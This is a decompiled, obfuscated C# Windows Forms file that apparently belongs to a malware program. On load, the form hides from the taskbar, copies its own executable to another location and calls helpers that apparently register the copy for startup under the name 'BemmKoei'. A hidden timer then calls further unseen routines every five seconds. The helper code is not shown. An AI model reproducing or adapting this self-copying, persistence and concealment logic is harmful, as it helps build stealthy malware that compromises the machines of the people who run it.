using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns1;

namespace ns2;

[DesignerGenerated]
internal class Form1 : Form
{
	private IContainer icontainer_0;

	[AccessedThroughProperty("Timer1")]
	private Timer timer_0;

	[AccessedThroughProperty("WebBrowser1")]
	private WebBrowser _WebBrowser1;

	internal virtual Timer Timer1
	{
		get
		{
			return timer_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (timer_0 != null)
			{
				timer_0.remove_Tick(eventHandler);
			}
			timer_0 = value;
			if (timer_0 != null)
			{
				timer_0.add_Tick(eventHandler);
			}
		}
	}

	internal virtual WebBrowser WebBrowser1
	{
		get
		{
			return _WebBrowser1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_WebBrowser1 = value;
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)Class2.Forms.Form1);
	}

	[DebuggerNonUserCode]
	void Form.Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		icontainer_0 = new Container();
		Timer1 = new Timer(icontainer_0);
		WebBrowser1 = new WebBrowser();
		((Control)this).SuspendLayout();
		Timer1.set_Interval(5000);
		((Control)WebBrowser1).set_Dock((DockStyle)5);
		WebBrowser webBrowser = WebBrowser1;
		Point location = new Point(0, 0);
		((Control)webBrowser).set_Location(location);
		WebBrowser webBrowser2 = WebBrowser1;
		Size minimumSize = new Size(20, 20);
		((Control)webBrowser2).set_MinimumSize(minimumSize);
		((Control)WebBrowser1).set_Name("WebBrowser1");
		WebBrowser webBrowser3 = WebBrowser1;
		minimumSize = new Size(334, 84);
		((Control)webBrowser3).set_Size(minimumSize);
		((Control)WebBrowser1).set_TabIndex(0);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		minimumSize = new Size(334, 84);
		((Form)this).set_ClientSize(minimumSize);
		((Control)this).get_Controls().Add((Control)(object)WebBrowser1);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("------");
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_ShowInTaskbar(false);
		if (((ServerComputer)Class2.Computer).get_FileSystem().FileExists(Class6.string_1))
		{
			Class6.smethod_0("BemmKoei", Class6.string_1);
			Class6.smethod_3();
		}
		else
		{
			Class6.smethod_1(Application.get_ExecutablePath(), Class6.string_1);
			Class6.smethod_0("BemmKoei", Class6.string_1);
			Class6.smethod_3();
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		Class6.smethod_4();
		Class6.smethod_5(Class6.string_3);
	}
}
